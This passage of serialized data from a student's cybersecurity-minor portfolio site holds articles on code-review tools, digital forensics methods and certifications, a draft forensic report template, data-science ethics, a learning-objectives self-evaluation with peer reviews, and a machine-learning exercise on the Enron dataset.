src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fcode-review\u002Fcode-quality_qonarcloud.png\" alt=\"SonarCloud dashboard\"\u002F\u003E\n\u003C\u002Fa\u003E\n\n#### Codacy\n\nCodacy automates code reviews and monitors code quality on every commit and pull request, reporting back on the impact of each commit or pull request, code style, best practices, security, and many other issues. It tracks changes in code coverage, duplication, and complexity. Saving developers' time during code reviews, allowing them to tackle technical debt more effectively. Currently, JavaScript, Java, Ruby, Scala, PHP, Python, CoffeeScript, and CSS are supported. Codacy is static analysis without the complication.\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fcode-review\u002Fcodacy.jpeg\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fcode-review\u002Fcodacy.jpeg\" alt=\"Codacy dashboard\"\u002F\u003E\n\u003C\u002Fa\u003E\n\n\n\nSources:\n\n- [mitre](https:\u002F\u002Fwww.mitre.org\u002Fpublications\u002Fsystems-engineering-guide\u002Fenterprise-engineering\u002Fsystems-engineering-for-mission-assurance\u002Fsecure-code-review)\n- [mitre code review report](https:\u002F\u002Fwww.mitre.org\u002Fpublications\u002Fall\u002Fsample-secure-code-review-report)\n\n",readingTime:n},{slug:"minor_digital-forensic-report",description:"A digital forensic report based on the Norton dataset",title:"digital forensics report",duration:k,image:y,tech:[{name:t},{name:"report"}],category:[{name:b},{name:h},{name:c}],author:{name:d,image:e,social:{twitter:f}},createdAt:z,dir:i,path:"\u002Fprojects\u002Fminor\u002Fdigital-forensic-report",extension:g,updatedAt:a,bodyPlainText:"\nhttps:\u002F\u002Fwww.rnyte-cyber.com\u002Fuploads\u002F9\u002F8\u002F5\u002F9\u002F98595764\u002Fexampledigiforensicsrprt_by_ryan_nye.pdf\n\nhttps:\u002F\u002Fwww.peertechzpublications.com\u002Farticles\u002FTCSIT-6-134.php\n\nhttps:\u002F\u002Fwww.forensicfocus.com\u002Farticles\u002Fwriting-dfir-reports-a-primer\u002F\n\n# Digital forensic report\n\n## Abstract\n\nThe purpose of this report is to provide evidence in the case of the Eron corporation fraud. Digital forensic standards, principles, procedures, and legal considerations that may influence the court's ruling are all included in the report.\n\nThe report's creation is unbiased, with the goal of assisting the court in making a decision on the case of the Eron corporation. The evidence given in this report is based on the email dataset the finding is detailed in this written report. The digital evidence acquired from the dataset is the center of this study. As a result, the evidence acquired outside the dataset is not included in the report. This report may include references to other report about this case.\n\n## Case background\n\n250 words\n\nover het onderzoek waarom wat is de reden voor onderzoek \n\n### Suspect summary\n\n| Priority | Suspect | Connection | Charge                | Bail |\n| -------- | ------- | ---------- | --------------------- | ---- |\n| 1        |         |            | - Market manipulation |      |\n| 2        |         |            |                       |      |\n| 3        |         |            |                       |      |\n\n## Standart principles, and Criteria followed \n\nVery inquiry adheres to the norms, concepts, and criteria indicated below.\nThe forensic community has stated broad concepts, the NIJ has outlined principles and processes, and the SWGDE has recommended criteria.\n\n### General Principles \n\nThe forensic community has outlined the following four main principles to applied during investigation:\n\n- No actions to change original data\n- Investigator(s) are competent to access original data\n- Audit trail created\n\n### Principles and procedures \n\nWhen evaluating the digital evidence presented in this report, the inquiry followed the National Institute of Justice's (NIJ) recommendations. The following aspects of a digital inquiry are described by the NIJ and include investigator comments in these areas.\n\n### Additional guidance \n",readingTime:"2 min read"},{slug:"minor_digital-forensic",description:"What is digital forensics and what processes are involved",title:t,duration:k,image:y,tech:[{name:t}],category:[{name:b},{name:h},{name:c}],author:{name:d,image:e,social:{twitter:f}},createdAt:z,dir:i,path:"\u002Fprojects\u002Fminor\u002Fdigital-forensic",extension:g,updatedAt:a,bodyPlainText:"\n# Digital Forensics\nDigital forensics is a branch of forensic science that focuses on the recovery and investigation of material found on digital devices and related to cybercrime. Digital forensics is the process of uncovering and interpreting electronic data. The goal of the process is to preserve evidence in its most original form while conducting a structured investigation by collecting, identifying and validating the digital information to reconstruct past events. The context is usually the use of data in a court of law, although digital forensics can be used in other cases as well.\n\n## Forensic methodologies and practices\nForensic investigations always go through set steps. \nIn some cases, not all steps are necessary to capture evidence. Then simply validation and identification is enough of a dataset.\nThe main elements of computer forensics are listed below:\n\n- The use of scientific method\n- Collection and preservation of data\n- Validation\n- Identification\n- Analysis and interpretation (machine learning \u002F statistics)\n- Documentation and presentation\n\nDifferent law enforcement agencies can only work together effectively if they communicate clearly with each other. The investigative team must keep the whole picture in mind and be clear when referring to specific components. It is fundamental that everyone understands whether a case only needs to be prepared, extracted and identified, or whether it also needs to be analyzed.\n\n## Preparation\u002FExtraction\nWhen the investigator's forensic platform is complete, he or she duplicates the forensic data provided in the request and verifies its integrity. This process assumes that law enforcement has already obtained the data through an appropriate legal process and created a forensic image.\n\nAfter the investigators have verified the integrity of the data to be analyzed, they develop a plan to extract the data. They organize and refine the forensic request into questions they understand and can answer. The forensic tools that allow them to answer these questions are selected. \nInvestigators generally have preliminary ideas about what to look for based on the request. \nThey add these to a \"Search Lead List,\" which is a running list of requested items. For example, \nthe request may have as a guideline \"search for child pornography.\" Investigators explicitly create a list of leads to help focus the investigation. As they develop new leads, they add them to the list, and as they exhaust the leads, they mark them as \"processed\" or \"done.\"\n\nSo before I begin extracting the given I have a goal in mind. \n\n## Identification\nInvestigators shall repeat the identification process for each item on the extracted list.\nIf an investigator finds an item that is incriminating but beyond the scope of the original search warrant, the investigator should immediately cease all activity, notify the appropriate persons, including the requester, and await further instructions. For example, law enforcement may seize a computer for evidence of tax fraud, but the investigator may find an image of child pornography.\n\n## Analysis \nIn the analysis phase, the researchers connect all the items and paint a complete picture for the applicant. For each item on the list of relevant data, the researchers answer questions such as who, what, when, where, and how. They try to explain which user or application created, edited, received or sent each item, and how it was originally created. Researchers also explain where they found it. Most importantly, they explain why all this information is important and what it means to the case.\n\n## Documenting and Reporting\n\nComputer forensic investigators must keep an accurate record of all activity related to the investigation, including all methods used for testing system functionality and retrieving, copying, and storing data, as well as all actions taken to acquire, examine, and assess evidence, in addition to fully documenting information related to hardware and software specs. This not only demonstrates how the integrity of user data has been kept, but it also confirms that all parties have followed relevant policies and processes. Because the entire procedure is designed to collect facts that may be used as evidence in a court of law, an investigator's inability to accurately document his or her findings is a major red flag.\n\n\n\n## History \n\nLooking back on the history of digital forensics, it's clear that law enforcement at the time had just a rudimentary understanding of how to apply digital forensic procedures. During the 1970s and 1980s, however, the forensics team was largely made up of members of federal law enforcement organizations with a background in computers. Because most paperwork is done digitally, the first area of concern for law enforcement was data storage. Seizing, keeping, and examining the documents was undeniably a time-consuming task for the authorities. In response to this, the FBI developed the Magnet Media program, the first formal digital forensics program, in 1984.\n\nOther strategies for detecting cybercriminals who break into computer systems were developed as a result. The first honeypot trap was invented in 1986 by Cliff Stoll, a Unix System Administrator at Lawrence Berkeley National Laboratory. Due to the proliferation of child pornography on the internet, digital forensics grew in popularity.\n\n## In action\n\nAs you can imagine, ethics are also very important within this profession. You have to work independently without prejudice. For this, you must therefore obtain a certificate to ensure your ethical conduct. Having a degree in criminal justice, psychology, engineering, biology or any other field with no certificates does not mean you’ll never get a job.\n\n### Certifications\n\nSome well-known forensic certifications include the following:\n\n- CISA – Certified Information Systems Auditor\n- CISSP – Certified Information Systems Security Professional\n- CCE – Certified Computer Examiner\n- CFCE – Certified Forensic Computer Examiner\n- GIAC – Global Information Assurance Certification\n  - GIAC Certified Forensic Analyst (GCFA)\n  - GIAC Advanced Smartphone Forensics (GASF)\n  - GIAC Certified Forensic Examiner (GCFE)\n  - GIAC Network Forensic Analyst (GNFA)\n  - GIAC Reverse Engineering Malware (GREM)\n  - GIAC Security Essentials (GSEC)\n\nForensic Software Vendor Training and Certificates can also be beneficial.  Some examples include:\n\n- ACE – AccessData Certified Examiner\n- BelkaCE – Belkasoft\n- EnCE – EnCase Certified Engineer\n- Cellebrite\n  - Cellebrite Certified Operator (CCO)\n  - Cellebrite Certified Physical Analyst (CCPA)\n  - Cellebrite Certified Mobile Examiner (CCME)\n- XRY – XRY Certification\n- X-PERT – X-Ways Professional in Evidence Recovery Techniques\n- BlackBag Technologies\n  - Certified Blacklight Examiner (CBE)\n  - Certified Mobilyze Operator (CMO)\n  - Mac and iOS Certified Forensic Examiner (MICFE)\n\nOther certificates you may also consider, that provide a more general computer foundation are:\n\n- CompTIA A+\n- CompTIA Network+\n- CompTIA Security+\n\nCertification courses are typically short courses, often less than 10 classes.\n\nEach certification course has their own requirements and can include professional time spent in a forensics related field.\n\nIt’s best to research each certification you’re planning to take to ensure you meet the requirements before deciding to take it.\n\n### Tooling\n\nIn the 1990s, digital investigations were conducted utilizing live analysis, and it was usual practice to review digital media using the device in question. With the growing use of devices capable of storing massive volumes of data, live analysis became inefficient. Digital forensic tools were eventually developed to examine data on a device without causing it any harm. Digital forensic tools are currently divided into three categories: open source digital forensic tools, hardware digital forensic tools, and others. Most common tooling today are the following\n\n- Sleuth Kit (+Autopsy)\n  - Sleuth Kit (+Autopsy) is a Windows-based utility program that simplifies computer forensic analysis. You may use this tool to inspect your hard disk and smartphone.\n- CAINE\n  - CAINE is an Ubuntu-based program that provides a graphical interface to a complete forensic environment. As a module, this tool can be integrated into current software solutions. It creates a chronology from RAM on its own.\n- PALADIN\n  - CAINE is an Ubuntu-based program that provides a graphical interface to a complete forensic environment. As a module, this tool can be integrated into current software solutions. It creates a chronology from RAM on its own.\n- EnCase\n  - Encase is an application that helps you to recover evidence from hard drives. It allows you to conduct an in-depth analysis of files to collect proof like documents, pictures, etc.\n- Wireshark\n  - Wireshark is a tool that analyzes a network packet. It can be used to for network testing and troubleshooting. This tool helps you to check different traffic going through your computer system.\n- ProDiscover Forensic\n  - ProDiscover Forensic is a computer security program that helps you to find all of the data on a hard drive. It can safeguard evidence and generate high-quality reports for use in judicial proceedings. EXIF (Exchangeable Image File Format) information can be extracted from JPEG files with this utility.\n\nBut for each solution, you can also find lots of scripts online that were created for specific purposes and made public by the analyst for others to use in their research as well \n\nHere are the main types of digital forensic tools:\n\n- Disk Forensic Tools\n  - SSD\n  - Hard drive \n- Network Forensic Tools\n- Wireless Forensic Tools\n- Database Forensic Tools\n- Malware Forensic Tools\n- Email Forensic Tools\n- Memory Forensic Tools\n- Mobile Phone Forensic Tools\n\nAs you can see, there are a whole bunch of subdomains that forensic analysis can be done on. Each domain has its own tooling to achieve the desired result. on each domain you can apply your own methods to get to the desired result for example I apply machine learning in my own project. \n\n***\nResource: \n- [computer forensics digital forensic analysis methodology](https:\u002F\u002Fwww.crime-scene-investigator.net\u002Fcomputer-forensics-digital-forensic-analysis-methodology.html)\n\n- [online.norwich.edu](https:\u002F\u002Fonline.norwich.edu\u002Facademic-programs\u002Fresources\u002F5-steps-for-conducting-computer-forensics-investigations)\n- [encouncil.org](https:\u002F\u002Fwww.eccouncil.org\u002Fwhat-is-digital-forensics\u002F)\n\n",readingTime:l},{slug:"minor_ethics-data-science",description:"What standards and values are involved in analyzing data. How to avoid prejudice.",title:A,duration:k,image:"\u002Fimages\u002Fprojects\u002Fminor\u002Fethics\u002Fmain.jpg",tech:[{name:A},{name:"data science"}],category:[{name:b},{name:h},{name:c}],author:{name:d,image:e,social:{twitter:f}},createdAt:"2021-10-24T00:00:00.000Z",dir:i,path:"\u002Fprojects\u002Fminor\u002Fethics-data-science",extension:g,updatedAt:a,bodyPlainText:"\n# Ethics - Data Science\nTo begin with, people tend to view data as objective by nature. \nWe tend to forget that data is only as accurate and objective as the people and processes used to generate and collect it.\n\nSecond, modern machine learning techniques are so complex that they are difficult for people to understand. \nThis makes it difficult to determine what the right inputs are and what the ethical implications of the results are. \nIt is almost as if the answer comes to us from a magic box, which we do not fully understand but blindly trust.\n\nPersonal data such as passwords, photos and location data can fall into the wrong hands. \nPredictive models used for policing and sentencing can reinforce stereotypes and have negative racial or socioeconomic consequences. \nOne can think of the benefits affair, where models had labeled a population as fraudulent. \nHere, a statistical analysis is done on data. The algorithms make a correlation between data which can cause inequalities and\u002For prejudice. \nIn this case it was people of a certain origin who were marked because according to static models they would cause more fraud.\n\n## Quality of research and finding false correlations\nThe scientist makes the data readable and in doing so the scientist has a great responsibility on correct interpretation.\n\nA good example of this is the correlation between consumption of \"ice cream\" and \"shark attacks.\" \nHere a correlation is measurable but he this is not correct.\n\nThere is also such a thing as a \"bias\", where there is a systematic bias towards a particular group in the data set. \nSuppose one wants to do a study on how well students perform across the country. \nIf one collects data from only the Fontys and then does an analysis on this, the data is erroneous. \nThe sample (Fontys students) is not representative for the population (students in the whole of the Netherlands). \nA better way to investigate the school performance of students is to take a random sample of students throughout the Netherlands and ask them about their performance at school. \nThis is just a small example but in the world of science this is very common.  \nOften this is also combined with other studies because questionnaires are not always reliable (again, different biases can occur).\n\nPredictive models only \"see\" the world through the data used for training. \nIn fact, they do not \"know\" any other reality.  \nWhen that data is biased, the accuracy and fidelity of the model are compromised.\n\nAn awful lot can go wrong in data analysis in this the scientist has a great ethical responsibility.  \n\n***\nRecourse:\n[The Good, The Bad, and The Creepy: Why Data Scientists Need to Understand Ethics](https:\u002F\u002Fwww.youtube.com\u002Fwatch?v=AnU0hm7uA_k&ab_channel=SASUsers )\n",readingTime:B},{slug:C,description:D,title:E,image:F,category:[{name:b},{name:h},{name:c}],author:{name:d,image:e,social:{twitter:f}},meta_data:{thank_reader:G},dir:i,path:"\u002Fprojects\u002Fminor\u002Flearning-objectives",extension:g,createdAt:a,updatedAt:a,bodyPlainText:"\n# Learning Objectives\nThe learning objectives I want to cover this semester (some of which I want to develop for the current minor \"Cyber\") are as followed:\nMathematica\n\n\u003Cdiv class=\"table-one\"\u003E\n\n| subject     | elaborate   | explanation |\n| ----------- | ----------- | ----------- |\n| Calculus    |             | Mathematics |\n| Logic       | X           | Logical proof and reasoning |\n| Sets        |             | Set theory - study and formalization of sets |\n| Statistics  | X           | Statistics is the science and technique of collecting, processing, interpreting, and presenting data |\n| Algorithmics| X           | Algorithmics is obviously about algorithms. The course covers various general algorithmic methods for solving problems |\n\nLanguage\n| subject     | elaborate   | explanation |\n| ----------- | ----------- | ----------- |\n| English C1  |             | Cambridge English level C1 Advanced |\n\nTooling\n| subject     | elaborate   | explanation |\n| ----------- | ----------- | ----------- |\n| Machine learning | X       | Applied to forensics |\n| Python      | X            | For applying machine learning |\n| Vim         |              | For writing python in an effective way |\n\nCyber:\n| subject     | elaborate   | explanation |\n| ----------- | ----------- | ----------- |\n| Forensics   | X           | Identification, acquisition, processing, analysis and reporting of data - (Individual) |\n| OSINT       | X           | Open-source intelligence - (Group project) |\n\n\u003C\u002Fdiv\u003E\n\n_I elaborate on the major learning objectives marked with an X below:_\n\nLearning Objectives and  their Assignments (Body of Knowledge).\n\n## Initial status knowledge\nPrior to this semester, I am going to get a clear vision about my knowledge. \nBecause of my previous cyber security specialization semesters, I can conclude that I have attained basic knowledge regarding these topics.\nOn the other hand, I have no prior knowledge regarding the learning objectives (stated above). \nWith this in mind I am going to immerse myself in these topics and make assignments that are going to prove that I have gained a basic knowledge to these topics.\n\n\n\u003Cstyle\u003E\n.table-one table th:first-of-type {\n    width: 10%;\n}\n.table-one table th:nth-of-type(2) {\n    width: 10%;\n}\n.table-one table th:nth-of-type(3) {\n    width: 50%;\n}\n.table-one table th:nth-of-type(4) {\n    width: 30%;\n}\n\u003C\u002Fstyle\u003E\n\n\n# PDR \n\n## Introduction \n\nThis page serves as a reading guide and also as my evaluation of the assignments made within the minor. We will focus on 3 aspects as described in the Cyber course. I will describe each learning objective briefly and give an evaluation. I will also talk about the group project and the tasks that we made within this group. I will also briefly show my peer assessment results as I have been assessed by my group members. In the conclusion, a reflection about all assignments is written; how it went and what could be better etc. \n\n## LO1 – Digital forensics \n\nMy specialization that I chose for this minor is Digital Forensics. This specialization is about collecting digital evidence that can show that an organization or person has performed things in a digital environment that are not acceptable. During this specialization route, I am going to look at ethical issues and the different possibilities within this specialization. I will also look at how tooling is used within an investigation. I will also shift my focus to the field of machine-learning and its applications within the cyber aspect. \n\nWhat a digital forensic does exactly can be read in my portfolio. Herein, I map out different topics and techniques. \n\n### Learning activies\n\n| Task                                             | Status | Pre-knowledge         |\n| ------------------------------------------------ | ------ | --------------------- |\n| Machine-learning Enron Dataset                   | Done   | None                  |\n| Machine-learning Gibbarish                       | Done   | None                  |\n| Machine-learning seclab                          | Done   | None                  |\n| Statistics formula’s                             | Done   | None                  |\n| Statistical research                             | Done   | None                  |\n| Captcha  mechanism                               | Done   | Some prior  knowledge |\n| Digital forensics methodology                    | Done   | None                  |\n| Course code cyber analysis (Secure code  review) | Done   | Prior  knowledge      |\n| Regular expressions “Regex” evil “Regex”         | Done   | Some prior  knowledge |\n| OSINT                                            | Busy   | None                  |\n| GDPR FDA 21 CFR Part 11                          | Busy   | Prior  knowledge      |\n| Pentest Methodology                              | Done   | Prior  knowledge      |\n| Own a linux system                               | Done   | None                  |\n| Algorithms                                       | Done   | Prior knowledge       |\n\n### Technical learning activities\n\nFor machine learning aspect I had to make a model that would detect so-called gibberish. This was part of a statistical research project where I was looking for a correlation between malicious URL's and gibberish. Since there was no open source model that would detect gibberish I had to make one myself. This was a challenge but I managed to make it work. After I got the model working I was able to write my research document for my statistical course. So these courses are connected to each other and have a cyber aspect to them. I also did some side project to further broaden my knowledge about other topics relating to cyber.  \n\n### Nontechnical learning activities\n\nThe non-technical learning activities are methodologies about different aspects within the Cyber security atmosphere. I also did some ethical research on topics of my interest. This gave me a broad view of what I can and can not do within my professional field.\n\n### Conclusion \n\nAs of now I have gained knowlegde in a number of technical learning objectives. I made this measurable by documenting the steps I took to get to my learning objectives. Before this, I did not have any prior knowledge in any of these topics so I have gained most of my knowledge during the execution of the assignments. It is fair to say that I have created a steady basis for myself to build up more knowledge regarding cyber related aspects.  \n\n## LO2\n\nThis chapter will address how I personally developed within the group project. In doing so, I will talk about the research and tasks I have made within the OSINT Project. I will also talk briefly about the communication within the group and the meetings with both the group members and stakeholders. \n\n### Project setting\n\nOSINT is an important part of the current state of the world. With OSINT, you can find a lot of information that is publicly known. Think about news websites, articles, social media and so on. Since Fontys wants to make their students more familiar with OSINT and the dangers and possibilities of it, we set up this project plan. The idea is to develop a CTF environment where students and government students can gain knowledge on how to use OSINT and what the possibilities and dangers are. At Fontys, government trainees and students come to learn what OSINT is all about. To keep this topic interesting, a fun and interactive way to demonstrate OSINT must be found. One way to accomplish this is a CTF related to OSINT. Capture the flags are a fun and interactive way to accomplish this.  \nThe goal is to develop a running, stable and reachable CTF system. Users should be able to play challenges independently and these challenges should have a storyline\u002Fgoal. Challenges are exercises that a user will have to perform in order to learn more about OSINT. Challenges should be fun and encouraging in order to motivate users to learn more. We also need to describe ethics and scenarios. With scenarios you can think of the Bellingcat and MH17 example. In challenges, users learn what tooling is applied, when it is applied and what tooling is available.\n\n### Contribution\n\nI was the scrum leader during the definition phase of the project. This meant that I was the first to define the tasks within the group and then assign them. I also have a big role within the creation of challenges within our platform. In doing so, I made sure that there was a set format and a set theme. The theme has to do with aliens who try to infiltrate our society. It is up to the trainee to track down these aliens. I have also contributed to the research within our group by helping to formulate the research questions and applying the .dot framework. I also made sure there was good communication within the group so that everyone knows what they are doing and the other way around. During the final sprint we showed all our challenges within our platform. We did this as a group in the form of a workshop with other students. These students gave feedback about our final challenges. After that we transformed the two group project is to one whole platform with combined challenges from both groups. \n\n### Conclusion \n\nFinally, in terms of my growth as an innovator, I have had experience expressing my ideas in the early stages of project development and sharing them with my colleagues. In addition, I have interacted with clients through interviews, meetings, a presentation, and reports.\n\n## LO3\n\nThis chapter will focus on a peer review of my project skills and feedback from my coach, stakeholders, and other external sources. It will also review and analyze things as well as my contributions to professional writing and communication tasks which include presenting, interviewing, relationship management and advising. It will also cover the ethical aspects of my professional development as a security professional.\n\n### Peerassement (1)\n\nBelow are the points that can be seen as given by my teammates within my project group. Score evaluation 1 t\u002Fm 5\n\n| ***Description\\***                                           | **Marks** | --   | --   | --   | --   |\n| ------------------------------------------------------------ | --------- | ---- | ---- | ---- | ---- |\n| *Comes up with  new, original, or usable ideas for the project* | 3         | 3    | 3    | 4    | 4    |\n| *Meets deadlines*                                            | 5         | 5    | 4    | 5    | 5    |\n| *Delivers quality work*                                      | 4         | 5    | 4    | 5    | 4    |\n| *Helps others*                                               | 4         | 4    | 5    | 4    | 4    |\n| *Brings up  problems, challenges, areas of concern for discussion* | 4         | 4    | 4    | 4    | 4    |\n| *Has a positive  effect on the group's work atmosphere*      | 5         | 5    | 5    | 5    | 5    |\n\n\u003Cstyle\u003E\ntable th:first-of-type {\n    width: 40%;\n}\ntable th:nth-of-type(2) {\n    width: 12%;\n}\ntable th:nth-of-type(3) {\n    width: 12%;\n}\ntable th:nth-of-type(4) {\n    width: 12%;\n}\ntable th:nth-of-type(5) {\n    width: 12%;\n}\n\u003C\u002Fstyle\u003E\n\n#### Strengths\n\n- Wanneer je bezig bent met iets, bijt je je er in vast. Altijd goede kwaliteit oplevering.\n- Works hard on creating new challenges and makes really creative and difficult ones.\n- Goede focus op je werkzaamheden\n- Works hard and shows others what you did. The work you do is always very good.\n\n#### Improvements \n\n- Communiceer gedurende de dag wat meer met het team\n- Mag gedurende de dag wat meer laten weten waar hij mee bezig is als hij niet aanwezig is.\n- Communiceer wat meer op een werkdag\n- Working very hard, maybe sometimes a bit too hard.\n\nAs you can see, the overall assessment is very positive. It is nice to hear that my groupmates think positively of me. This is very motivating to continue developing the project.\nNevertheless, there are also some things in which I can still improve myself. The most important point is communication. The first few weeks, this went very well but due to matters outside of school I was unable to come to school on location for the last two weeks. \n\n### Peerassement (2)\n\nBelow are the points that can be seen as given by my teammates within my project group. Score evaluation 1 t\u002Fm 4\n\n| ***Description\\***                                           | **Marks** | -- v | -- r | -- j | -- jo |\n| ------------------------------------------------------------ | --------- | ---- | ---- | ---- | ----- |\n| *Helps others*                                               | 4         | 3    | 3    | 4    | 4     |\n| *Takes responsibility within the project for the work to be done* | 4         | 3    | 3    | 4    | 4     |\n| *Open to receive feedback from others*                       | 4         | 3    | 4    | 4    | 4     |\n| *Capable of giving feedback to others*                       | 4         | 3    | 4    | 4    | 4     |\n| *Delivers results as agreed on (meets deadlines)*            | 4         | 3    | 4    | 4    | 4     |\n| *Particpates actively in group process*                      | 4         | 3    | 3    | 4    | 4     |\n| Cooperative attitude (team player)                           | 4         | 3    | 4    | 4    | 4     |\n| Contributes to group ambience                                | 4         | 3    | 4    | 4    | 4     |\n| Signals problems and contributes to solving them             | 4         | 3    | 4    | 4    | 4     |\n| Quality of work                                              | 4         | 3    | 4    | 4    | 4     |\n\n\u003Cstyle\u003E\ntable th:first-of-type {\n    width: 40%;\n}\ntable th:nth-of-type(2) {\n    width: 12%;\n}\ntable th:nth-of-type(3) {\n    width: 12%;\n}\ntable th:nth-of-type(4) {\n    width: 12%;\n}\ntable th:nth-of-type(5) {\n    width: 12%;\n}\n\u003C\u002Fstyle\u003E\n#### Strengths\n\n- Great focus on your tasks\n- Works very hard on assignments\n- works hard when at home\n- Betrokken en sociaal\n\n#### Improvements \n\n- Let others know what you're doing and maybe show them, this way they know what you're doing.\n\nAs you can see, the overall assessment is very positive. It is nice to hear that my groupmates think positively of me. I also see a improvement in my communication skills on a professional level. \n\n### Conclusion \n\nOverall, I have developed myself well this semester the feedback I received was generally very positive. there was a point of development for communication I worked on this and it is reflected in the reviews of my team members. Because of the alternating corona measures and consequences of working from home, it was sometimes difficult to switch. I did have trouble with that, but generally speaking the whole group did. Despite all this, it went well and we were able to deliver a nice product. \n\n### Professional writing\n\nFor the professional writing I chose to write my portfolio in English. Currently I am taking an English course to bring my English to a professional level so writing my portfolio in English is a very good exercise. I have also done different researches like the static research. This has also contributed to my professionalism so I have learned how to set up a hypothesis, do research and analyze the data. In the process I also learned how to draw a conclusion from the results as found in the research. \n\n### Ethical aspect. \n\nI have delved quite deeply into the ethical processes within the topics I cover. I have also done this for the group project. This has taught me how to approach certain things and what things cannot be done within the field and specialization. \n\n### Network\n\nDuring this minor I was actively searching graduating position in Software Engineering. For this I look some time to setup my LinkedIn profile. I have been in contact with multiple companies and chose one that took my interest. In doing so i expanded my social network on LinkedIn. I also developed the site you're looking at this during this minor. Within this site you can read about all the topic I covered. \n\n### Intercultural competence\n\nDuring this semester I followed an English C1 Cambridge course in the evening hours. The focus is mainly on cultural aspects and which words fit best in a situation to speak fluently and native. I also chose to write documentation in English this entire semester, and the workshops that were in English also contributed to this. \n\n## General Conslusion \n\nOverall, I think I learned a lot in this minor. In doing so, I placed my focus mainly on performing machine learning in the area of cyber. I had no prior knowledge of this topic. Now I have a broad scale of knowledge both technical and non technical aspects working on the group project and on the portfolio helped to improve my technical and non-technical and professional and innovations skills. I was happy in the way this minor was structured. It was very open minded I was free in learning about things of interest what I personally find very motivating. It was also allowed to combined different aspects within the cyber atmosphere. I did a lot of side projects that interested me I learned a lot about all of them and besides you really benefit if you are free in what you want to learn because you only learn what you are interested in. Finally, I would like to conclude this minor by thanking all the teachers, especially Stefan and Peter, for their great guidance. \n\nI will evetually graduate in the field of software-engineering, but all the knowledge I have gained during this minor is very valuable.",readingTime:H},{slug:"minor_machine-learning",description:"A project where I apply machine learning to the aspect of cyber. Here I am using techniques such as naive bayes for label detection in a dataset",title:u,duration:"full time 3 weeks",image:"\u002Fimages\u002Fprojects\u002Fminor\u002Fmachine_learning\u002Fminor_cyber_machine_learning.png",tech:[{name:u},{name:"naive bayes"}],category:[{name:b},{name:h},{name:c}],author:{name:d,image:e,social:{twitter:f}},github:I,createdAt:"2021-11-17T00:00:00.000Z",dir:i,path:"\u002Fprojects\u002Fminor\u002Fmachine-learning",extension:g,updatedAt:a,bodyPlainText:"\n# Machine Learning\n## Introduction\nI would like to learn how to apply \"Machine Learning\" to data and thereby perform a useful analysis on this data. \nI would like to learn this as a new challenge to learn more about the techniques behind Machine Learning. \nWhat is it, what is it used for or when to use it. \nI am going to link to Cyber by performing a data analysis on a dataset related to the subject of cyber. \nIn doing so, I am using the \"Eron\" dataset which is specifically used for forensics. \nIn order to apply all of this, I need to learn about the different types of algorithms out there. \nFor this I need Python and knowledge of the types of algorithms out there and when to apply them. \nBy executing and following course on Udacity and the associated assignments, \nI am going to make this learning goal measurable for myself. \nFurthermore, I also want to eventually be able to perform an analysis on the Enron dataset.\n\n## Evaluate\n### Version (1)\nCurrently I am working on Udacity: [\"Intro to Machine Learning\"](https:\u002F\u002Fwww.udacity.com\u002Fcourse\u002Fintro-to-machine-learning--ud120). \nThis course I have now 50% completed. \nDuring this course I learned about Naive Bayes, SVM, Decision Trees and Regression. \nThe material was easy to understand but at the moment I do not know how I can apply it within my own project\u002Fresearch. \nThe step from theory to practice\n\n### Version (2)\nHere I have been working on building an algorithm that detects gibberish. \nThis was quite difficult because I had no prior knowledge.\nI contacted lecturer Peter Lambooij and discussed how I could best approach this. \nHe suggested that I delve further into Naive Bayes. \nI had a small knowledge of Naive Bayes from the Udacity course but to build the algorithm I needed more knowledge so I decided to delve further into this subject. \nAfter finding out how the algorithm works and its applications I started to build a prototype. \nAfter the prototype, I built a final version whose elaboration is described below. \nDescribing the elaboration was difficult because the prepairing of the data was quite complicated.\n\n# Assignments\n## Enron Dataset\nThe Enron Email Corpus is a massive dataset, containing approximately 500,000 messages from executives of the Enron Corporation. \nEnron was a large American company that was investigated by the Federal Energy Regulatory Commission (FERC) in 2001 after its rather spectacular bankruptcy and dissolution. \nIt contains records of about 150 users, mostly management of Enron, organized in folders. \nThe corpus contains a total of about 0.5M messages. \nThis data was originally made public, and put on the web, by the Federal Energy Regulatory Commission during its investigation. \nIn its raw form, the Enron corpus is a massive collection of folders containing 2.2 Gigabytes of messages in MBOX format, all individually preserved\n\n### Biggest corporate fraud\nBut first we need to know something about the biggest corporate fraud in American history!\nThe Enron fraud is a big, messy, and totally fascinating story of corporate malfeasance of almost every type imaginable. \nAlthough it started out as an energy company, it was involved in so many complex issues that people didn't understand exactly what the company was doing. \nEnron was fantastic! Very attractive to investors and the fastest growing company that was making money at a rate no one had ever seen. \nThey were the darlings of Wall Street, a company that could never lose. \nIt had good political connections, was making money at an incredible rate, and seemed to be the leading innovative company and highly profitable investment.\n\nIn the course I will be taking, \nwe are going to use Python to analyze the dataset, \nand discover patterns and clues through data exploration, \nas well as build a regression model that could predict the bonus of a person at Enron based on the salaries he receives.\n\nrecourse:\n- [The EnronSent Corpus](https:\u002F\u002Fwww.colorado.edu\u002Fics\u002Fsites\u002Fdefault\u002Ffiles\u002Fattached-files\u002F01-11_0.pdf)\n- [Deriving Patterns of Fraud from the Enron Dataset](https:\u002F\u002Ftowardsdatascience.com\u002Fderiving-patterns-of-fraud-from-the-enron-dataset-64cbceb65c36)\n\n### Analysis on enron mail datasets \nAnalysis on enron mail datasets:\n| Question | answer |\n| ----------- | ----------- |\n| How many data points (people) are in the data set? | 146 |\n| For each person, how many functions are available? | 21 |\n| How many POIs are there in the E+F dataset? | 18 |\n| How many POIs are there in total? | 35 |\n| What is the total value of James Prentice's shares?\t| 1095040 |\n| How many emails do we have from Wesley Colwell to persons of interest? | 240 |\n| What is the value of stock options exercised by Jeffrey K Skilling?\t| 19250000 |\n| Who made the most money? | YEAP SOON |\n| How many people in this dataset have a quantified salary? | 95 |\n| How many people in this dataset have an email address? | 111 |\n| How many people in the E+F dataset (as it currently exists) have \"NaN\" for their total payments? | 21 |\n| What percentage of people in the data set as a whole do? | 14.38% |\n| How many POIs in the E+F dataset have \"NaN\" for their total payments? | 0 |\n| What percentage of POIs as a whole is this? | 0% |\n\n### learning objectives\nThe assignment above here elaborate the following learning objectives from body of knowledge:\n- Study forensic methodologies and practices (see resources below). List these standards and how and where they are applied in your portfolio or in a blog or article.\n- Work out forensic challenges that you can find online or get from teachers.\n\n\n## 